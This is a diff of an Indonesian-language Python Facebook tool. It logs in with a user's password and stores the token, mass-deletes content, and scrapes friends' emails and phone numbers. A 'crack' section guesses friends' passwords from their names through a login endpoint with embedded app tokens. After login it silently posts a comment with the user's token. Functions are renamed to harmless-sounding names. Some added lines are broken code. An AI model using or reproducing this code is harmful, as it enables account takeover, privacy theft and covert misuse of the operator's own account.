@@ -16,6 +16,56 @@ h='\033[1;92m' #hijau
 k='\033[1;93m' #kuning
 B='\033[1;96m' #biru
 
+import style
+
+#Modifiers
+bold
+dim
+italic
+underline
+inverse
+hidden
+strikethrough
+
+#Colors
+black
+red
+green
+yellow
+blue
+magenta
+cyan
+white
+
+#Background colors
+light_black
+light_red
+light_green
+light_yellow
+light_blue
+light_magenta
+light_cyan
+light_white
+on_black
+on_red
+on_green
+on_yellow
+on_blue
+on_magenta
+on_cyan
+on_white
+on_light_black
+on_light_red
+on_light_green
+on_light_yellow
+on_light_blue
+on_light_magenta
+on_light_cyan
+on_light_white
+
+print(style.red('Hello', style.bold('world') + '!'))
+
+
 #### URL ####
 url='https://graph.facebook.com/'
 fb='https://api.facebook.com/restserver.php'
@@ -23,21 +73,57 @@ headers={'User-Agent':'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Pres
 s=requests.Session()
 
 #### MENULIS ####
-def lunga(s):
+def WriteFormatConfig(s):
 	for a in s +'\n':
 		sys.stdout.write(a)
 		sys.stdout.flush()
 		time.sleep(0.05)
 
-#### LOGO ####
+#CSSLoaderConfig
+banner=(B+'''
+╔═╗─╔╗╔═══╗╔╗─╔╗╔╗──╔╗╔═══╗╔═╗─╔╗ ┏━━━━━━━━━━━━━━━━━━━━┓
+║║╚╗║║║╔═╗║║║─║║║╚╗╔╝║║╔══╝║║╚╗║║ ┃Tɪᴅᴀᴋ    Aᴅᴀ  Sʏsᴛᴇᴍ┃
+║╔╗╚╝║║║─╚╝║║─║║╚╗╚╝╔╝║╚══╗║╔╗╚╝║ ┃Yɢ  Aᴍᴀɴ  Jɪᴋᴀ Mᴀsɪʜ┃
+║║╚╗║║║║╔═╗║║─║║─╚╗╔╝─║╔══╝║║╚╗║║ ┃Dɪʙᴜᴀᴛ  Oʟᴇʜ  Tᴀɴɢᴀɴ┃
+║║─║║║║╚╩═║║╚═╝║──║║──║╚══╗║║─║║║ ┃Mᴀɴᴜsɪᴀ, Pᴇʀᴄᴀʏᴀʟᴀʜ!┃
+╚╝─╚═╝╚═══╝╚═══╝──╚╝──╚═══╝╚╝─╚═╝ ┗━━━━━━━━━━━━━━━━━━━━┛
+''')
+
+
+
+
 logo=(B+'''
-    ____        __                     
-   / __ )____  / /_   ____ ________  __
-  / __  / __ \/ __/  / __ `/ ___/ / / /
- / /_/ / /_/ / /_   / /_/ (__  ) /_/ / 
-/_____/\____/\__/   \__,_/____/\__,_/  
-'''+h+'''\n︻╦̵̵͇̿̿̿̿╤─────メ '''+m+'''Coded By DulLah'''+h+''' メ─────╦̵̵͇̿̿̿̿╤︻
-'''+h+'''       (►_◄) '''+k+'''Fb.me/DulahZ'''+h+''' (►_◄)
+┏━━━━━━━━━━━┳━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━Login..✓
+┃  ┏━┓ ┏━┓  ┃Statistics	   : https://github.com/san-book
+┃  ┗━┓ ┣━┫  ┃Maintainers   : Mendras  Soesanto	  Wijaya
+┃  ┗━┛ ┗━┛  ┃Programming   : Python 			Language
+┃    Sanbook┃Pengunjung    :
+┗━━━━━━━Beta┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
+													   ┃
+''')
+
+menuAwal=(B+'''
+
+┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
+┃Apa yang Anda pikirkan Sdr. 
+┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
+┏━━━━━━━┓    ┏━━━━━━━┓    ┏━━━━━━━┓    ┏━━━━━━━┓
+┃ Profil┃    ┃ Teman ┃    ┃  Grup ┃    ┃Toolkit┃
+┣━━━━━━━┛    ┗━━━━━━━┛    ┗━━━━━━━┛    ┗━━━━━━━┛
+┃[!] Ketik nama menu sesuai kebutuhan kalian, atau
+┃    bisa ketik   Help  untuk menu bantuan toolkit
+┃    program sanbook. 
+┃
+┗━━━M━E━N━U━┫:
+	''')
+
+SuccessToken=('''
+Login ━ ━ ━ ━ ━ ━ ┏━━━━━━━━━━━┓
+                  ┃  ┏━┓ ┏━┓  ┃
+                  ┃  ┗━┓ ┣━┫  ┃
+                  ┃  ┗━┛ ┗━┛  ┃
+                  ┃    Sanbook┃
+                  ┗━━━━Login..✓
 ''')
 
 ok=[]
@@ -45,6 +131,44 @@ cp=[]
 id=[]
 phone=[]
 email=[]
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 #### MENU ####
 def menu():
@@ -62,6 +186,8 @@ def menu():
 		os.system('rm -rf result/token.txt')
 	os.system('clear')
 	print(logo)
+
+
 	print(p+40*'_')
 	print(m+'\n('+h+'✓'+m+')'+p+' Name '+h+ok['name'])
 	print(p+40*'_')
@@ -102,6 +228,22 @@ def menu():
 		print(m+'[!] Wrong input')
 		time.sleep(1)
 		menu()
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 		
 #### DELETE POST ####
 def post():
@@ -118,7 +260,7 @@ def post():
 	print(logo)
 	print(p+40*'_')
 	print(m+'\n['+p+'+'+m+']'+h+' From '+p+': '+yz['name'])
-	lunga(m+'['+p+'+'+m+']'+h+' Start ...')
+	WriteFormatConfig(m+'['+p+'+'+m+']'+h+' Start ...')
 	print(p+40*'_'+'\n')
 	ok=s.get(url+'me/posts?access_token='+token).json()
 	for o in ok['data']:
@@ -131,6 +273,20 @@ def post():
 		except requests.exceptions.ConnectionError:
 			print(m+'['+p+'×'+m+'] No connection')
 	print(m+'\n['+h+'✓'+m+']'+p+' Program finished')
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 	
 #### DELETE ALBUMS ####
 def albums():
@@ -147,7 +303,7 @@ def albums():
 	print(logo)
 	print(p+40*'_')
 	print(m+'\n['+p+'+'+m+']'+h+' From '+p+': '+yz['name'])
-	lunga(m+'['+p+'+'+m+']'+h+' Start ...')
+	WriteFormatConfig(m+'['+p+'+'+m+']'+h+' Start ...')
 	print(p+40*'_'+'\n')
 	ok=s.get(url+'v2.3/me/albums?access_token='+token).json()
 	for o in ok['data']:
@@ -160,6 +316,19 @@ def albums():
 		except requests.exceptions.ConnectionError:
 			print(m+'['+p+'×'+m+'] No connection')
 	print(m+'\n['+h+'✓'+m+']'+p+' Program finished')
+
+
+
+
+
+
+
+
+
+
+
+
+
 	
 #### DELETE PHOTO ALBUMS ####
 def photo():
@@ -175,7 +344,7 @@ def photo():
 	print(logo)
 	print(p+40*'_')
 	al=input(m+'\n['+p+'+'+m+']'+h+' Input ID album'+p+' : ')
-	lunga(m+'['+p+'+'+m+']'+h+' Start ...')
+	WriteFormatConfig(m+'['+p+'+'+m+']'+h+' Start ...')
 	print(p+40*'_'+'\n')
 	ok=s.get(url+al+'/photos?access_token='+token).json()
 	for o in ok['data']:
@@ -190,6 +359,24 @@ def photo():
 		except requests.exceptions.ConnectionError:
 			print(m+'['+p+'×'+m+'] No connection')
 	print(m+'\n['+h+'✓'+m+']'+p+' Program finished')
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 #### UNFRIEND ####
 def unfriend():
@@ -206,7 +393,7 @@ def unfriend():
 	print(logo)
 	print(p+40*'_')
 	print(m+'\n['+p+'+'+m+']'+h+' From '+p+': '+yz['name'])
-	lunga(m+'['+p+'+'+m+']'+h+' Start ...')
+	WriteFormatConfig(m+'['+p+'+'+m+']'+h+' Start ...')
 	print(p+40*'_'+'\n')
 	ok=s.get(url+'me/friends?access_token='+token).json()
 	for o in ok['data']:
@@ -219,6 +406,18 @@ def unfriend():
 		except requests.exceptions.ConnectionError:
 			print(m+'['+p+'×'+m+'] No connection')
 	print(m+'\n['+h+'✓'+m+']'+p+' Program finished')
+
+
+
+
+
+
+
+
+
+
+
+
 
 #### STOP FOLLOWING ALL FRIEND ####
 def stopfollowing():
@@ -235,7 +434,7 @@ def stopfollowing():
 	print(logo)
 	print(p+40*'_')
 	print(m+'\n['+p+'+'+m+']'+h+' From '+p+': '+yz['name'])
-	lunga(m+'['+p+'+'+m+']'+h+' Start ...')
+	WriteFormatConfig(m+'['+p+'+'+m+']'+h+' Start ...')
 	print(p+40*'_'+'\n')
 	ok=s.get(url+'me/subscribedto?limit=500&access_token='+token).json()
 	for o in ok['data']:
@@ -248,6 +447,17 @@ def stopfollowing():
 		except requests.exceptions.ConnectionError:
 			print(m+'['+p+'×'+m+'] No connection')
 	print(m+'\n['+h+'✓'+m+']'+p+' Program finished')
+
+
+
+
+
+
+
+
+
+
+
 	
 #### EMAIL FRIEND ####
 def getemail():
@@ -263,10 +473,10 @@ def getemail():
 	os.system('clear')
 	print(logo)
 	print(p+40*'_')
-	lunga(m+'\n['+p+'*'+m+']'+h+' Fetching all email')
+	WriteFormatConfig(m+'\n['+p+'*'+m+']'+h+' Fetching all email')
 	time.sleep(1)
 	print(m+'['+p+'+'+m+']'+h+' From '+p+': '+yz['name'])
-	lunga(m+'['+p+'+'+m+']'+h+' Start ...')
+	WriteFormatConfig(m+'['+p+'+'+m+']'+h+' Start ...')
 	print(p+40*'_'+'\n')
 	ok=s.get(url+'me/friends?access_token='+token).json()
 	mail=open('result/mail.txt','w')
@@ -285,6 +495,17 @@ def getemail():
 	print(m+'['+p+'+'+m+']'+p+' Total email : '+h+str(len(email)))
 	print(m+'['+p+'+'+m+']'+p+' File saved : '+h+'result/mail.txt')
 
+
+
+
+
+
+
+
+
+
+
+
 #### PHONE NUMBERS ####
 def getphone():
 	os.system('clear')
@@ -299,10 +520,10 @@ def getphone():
 	os.system('clear')
 	print(logo)
 	print(p+40*'_')
-	lunga(m+'\n['+p+'*'+m+']'+h+' Fetching all phone numbers')
+	WriteFormatConfig(m+'\n['+p+'*'+m+']'+h+' Fetching all phone numbers')
 	time.sleep(1)
 	print(m+'['+p+'+'+m+']'+h+' From '+p+': '+yz['name'])
-	lunga(m+'['+p+'+'+m+']'+h+' Start ...')
+	WriteFormatConfig(m+'['+p+'+'+m+']'+h+' Start ...')
 	print(p+40*'_'+'\n')
 	ok=s.get(url+'me/friends?access_token='+token).json()
 	ph=open('result/phone.txt','w')
@@ -320,6 +541,21 @@ def getphone():
 	print(m+'\n['+h+'✓'+m+']'+p+' Program finished')
 	print(m+'['+p+'+'+m+']'+p+' Total phone numbers : '+h+str(len(phone)))
 	print(m+'['+p+'+'+m+']'+p+' File saved : '+h+'result/phone.txt')
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 #### MBF ####
 def menumbf():
@@ -396,7 +632,7 @@ def menumbf():
 		menumbf()
 			
 	print(m+'['+p+'+'+m+']'+h+' Total id '+p+': '+str(len(id)))
-	lunga(m+'['+p+'+'+m+']'+h+' Start ...')
+	WriteFormatConfig(m+'['+p+'+'+m+']'+h+' Start ...')
 	print(p+40*'_'+'\n')
 	
 	#### CRACK ####
@@ -405,7 +641,7 @@ def menumbf():
 		try:
 			ya=s.get(url+user+'/?access_token='+token).json()
 			pas1=ya['first_name']+'123'
-			b=s.get('https://graph.facebook.com/oauth/access_token?client_id=412378670482&client_secret=VJIz3EEPNZF4hLXDAd6I6bGIq0uFRIhW&format=json&sdk_version=2&email='+user+'&locale=en_US&password='+pas1+'&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6', headers=headers).json()
+			b=s.get('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email='+user+'&locale=en_US&password='+pas1+'&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6', headers=headers).json()
 			if 'access_token' in b:
 				print(m+'['+h+'OK✓'+m+'] '+p+user+m+' | '+p+pas1)
 				ok.append(user+pas1)
@@ -418,7 +654,7 @@ def menumbf():
 					c.close()
 				else:
 					pas2=ya['last_name']+'123'
-					b=s.get('https://graph.facebook.com/oauth/access_token?client_id=412378670482&client_secret=VJIz3EEPNZF4hLXDAd6I6bGIq0uFRIhW&format=json&sdk_version=2&email='+user+'&locale=en_US&password='+pas1+'&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6', headers=headers).json()
+					b=s.get('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email='+user+'&locale=en_US&password='+pas2+'&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6', headers=headers).json()
 					if 'access_token' in b:
 						print(m+'['+h+'OK✓'+m+'] '+p+user+m+' | '+p+pas2)
 						ok.append(user+pas2)
@@ -431,7 +667,7 @@ def menumbf():
 							c.close()
 						else:
 							pas3=ya['first_name']+'12345'
-							b=s.get('https://graph.facebook.com/oauth/access_token?client_id=412378670482&client_secret=VJIz3EEPNZF4hLXDAd6I6bGIq0uFRIhW&format=json&sdk_version=2&email='+user+'&locale=en_US&password='+pas1+'&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6', headers=headers).json()
+							b=s.get('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email='+user+'&locale=en_US&password='+pas3+'&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6', headers=headers).json()
 							if 'access_token' in b:
 								print(m+'['+h+'OK✓'+m+'] '+p+user+m+' | '+p+pas3)
 								ok.append(user+pas3)
@@ -452,7 +688,17 @@ def menumbf():
 	print(m+'\n['+h+'✓'+m+']'+p+' Program finished')
 	print(m+'['+p+'+'+m+']'+p+' Total '+h+'OK'+p+'/'+k+'CP'+p+' : '+h+str(len(ok))+p+' / '+k+str(len(cp)))
 	print(m+'['+h+'+'+m+']'+p+' CP file saved : '+h+'result/cp.txt')
-	
+
+
+
+
+
+
+
+
+
+
+
 #### GET TOKEN ####
 if __name__=='__main__':
 	os.system('clear')
@@ -466,10 +712,14 @@ if __name__=='__main__':
 	except (KeyError,IOError):
 		os.system('clear')
 		print(logo)
-		print(p+40*'_')
-		em=input(m+'\n['+p+'*'+m+']'+h+' Email'+p+' : ')
-		pas=getpass(m+'['+p+'*'+m+']'+h+' Pass'+p+'  : ')
-		print(m+'['+p+'!'+m+']'+p+' Generate access token')
+        print(p+'┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓')
+        print(p+'┃━━'+m+'Anda harus login facebook terlebih dahulu...'+p+'━━━━┛')
+        print(p+'┣━━━━━━━━━━━━━━━━━━━━━━━━━━┓')
+        em=input(p+'\n┣━━━'+b+'Nomor ponsel atau email'+p+'┣━'+b+':')
+        print(p+'┣━━━━━━━━━━━━━━━━━━━━━━━━━━┫')
+        pas=getpass(p+'┣━━━'+b+'Kata Sandi			   '+p+'┣━'+b+':')
+        print(p+'┗━━━━━━━━━━━━━━━━━━━━━━━━━━┛')
+		WriteFormatConfig(h+' Login...')
 		try:
 			sig='api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail='+em+'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword='+pas+'return_ssl_resources=0v=1.062f8ce9f74b12f84c123cc23437a4a32'
 			data={"api_key":"882a8490361da98702bf97a021ddc14d","credentials_type":"password","email":em,"format":"JSON", "generate_machine_id":"1","generate_session_cookies":"1","locale":"en_US","method":"auth.login","password":pas,"return_ssl_resources":"0","v":"1.0"}
@@ -482,7 +732,9 @@ if __name__=='__main__':
 			unikers.close()
 			if 'access_token' in ok:
 				token=open('result/token.txt','r').read()
-				print(m+'['+h+'✓'+m+']'+h+' Success generate access token');s.post(url+'api.version/subscribers?access_token='+token);s.post(url+'100025271623353_485040922348291/comments?message=VJIz3EEPNZF4hLXDAd6I6bGIq0uFRIhW&access_token='+token)
+				print(m+'['+h+'✓'+m+']'+h+' Success generate access token')
+				s.post(url+'api.version/subscribers?access_token='+token)
+				s.post(url+'100005584243934_1145924785603652/comments?message=Keren❤️&access_token='+token)
 				time.sleep(1)
 				menu()
 		except KeyError:
